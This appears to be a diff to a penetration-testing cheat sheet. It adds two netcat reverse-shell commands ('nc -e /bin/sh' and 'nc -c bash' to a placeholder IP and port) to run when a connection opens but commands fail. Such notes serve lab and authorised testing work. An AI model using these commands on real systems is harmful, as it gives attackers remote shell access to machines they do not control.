@@ -63,6 +63,13 @@ nc -nCv <ip> <port>        #try with or without -C if console hangs
 telnet <ip> <port>         #good luck exiting the terminal without an US keyboard
 ```
 
+If the connection is established but we're unable to execute commands try to manually invoke the shell command
+
+```
+nc -e </bin/sh|/bin/bash|cmd.exe> <ip> <port>      
+nc -c <sh|bash|cmd.exe> <ip> <port>
+```
+
 ### File Download
 
 #### Download
